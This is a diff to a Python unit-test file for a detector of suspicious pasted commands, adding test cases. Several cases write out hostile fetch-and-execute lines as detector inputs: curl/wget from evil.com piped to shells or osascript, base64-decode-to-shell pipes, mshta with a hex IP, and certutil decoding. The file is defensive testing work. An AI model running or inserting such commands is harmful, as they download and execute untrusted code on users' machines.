@@ -17,7 +17,7 @@ class TestClean(unittest.TestCase):
         self.assertIsNone(check_for_suspicious_content(""))
 
     def test_plain_text(self):
-        self.assertIsNone(check_for_suspicious_content("Hello, world\!"))
+        self.assertIsNone(check_for_suspicious_content("Hello, world!"))
 
     def test_normal_url(self):
         self.assertIsNone(check_for_suspicious_content("https://example.com/file.html"))
@@ -52,6 +52,12 @@ class TestClean(unittest.TestCase):
     def test_bare_invoke_expression_mention(self):
         self.assertIsNone(check_for_suspicious_content("The Invoke-Expression cmdlet evaluates a string"))
 
+    def test_plain_text_zsh_mention(self):
+        self.assertIsNone(check_for_suspicious_content("Install zsh on your Mac for a better shell experience"))
+
+    def test_plain_text_base64_mention(self):
+        self.assertIsNone(check_for_suspicious_content("The base64 encoding scheme is used to encode binary data"))
+
 
 class TestSuspicious(unittest.TestCase):
     """Content that SHOULD trigger a warning."""
@@ -64,6 +70,37 @@ class TestSuspicious(unittest.TestCase):
 
     def test_wget_pipe_sh(self):
         self.assertIsNotNone(check_for_suspicious_content("wget https://evil.com/payload | sh"))
+
+    def test_wget_pipe_bash(self):
+        self.assertIsNotNone(check_for_suspicious_content("wget https://evil.com/payload | bash"))
+
+    def test_curl_pipe_zsh(self):
+        self.assertIsNotNone(check_for_suspicious_content("curl https://evil.com/payload | zsh"))
+
+    def test_wget_pipe_zsh(self):
+        self.assertIsNotNone(check_for_suspicious_content("wget https://evil.com/payload | zsh"))
+
+    def test_base64_macos_decode_pipe_zsh(self):
+        # macOS base64 -D (capital D) — Anvilogic high-fidelity indicator
+        self.assertIsNotNone(check_for_suspicious_content('echo "SGVsbG8=" | base64 -D | zsh'))
+
+    def test_base64_linux_decode_pipe_bash(self):
+        # Odyssey Stealer pattern: no curl, standalone base64 -d
+        self.assertIsNotNone(check_for_suspicious_content('echo "SGVsbG8=" | base64 -d | bash'))
+
+    def test_base64_decode_pipe_sh(self):
+        self.assertIsNotNone(check_for_suspicious_content('echo "SGVsbG8=" | base64 -d | sh'))
+
+    def test_curl_pipe_osascript(self):
+        # Datadog-documented pattern: pipe to osascript without -e flag
+        self.assertIsNotNone(check_for_suspicious_content("curl https://evil.com/script | osascript"))
+
+    def test_mshta_hex_url(self):
+        # Huntress-documented pattern: hex-encoded IP in mshta URL
+        self.assertIsNotNone(check_for_suspicious_content("mshta http://81.0x5a.29.64/payload"))
+
+    def test_certutil_decode(self):
+        self.assertIsNotNone(check_for_suspicious_content("certutil -decode encoded.txt output.exe"))
 
     def test_powershell(self):
         self.assertIsNotNone(check_for_suspicious_content("powershell -Command Get-Process"))
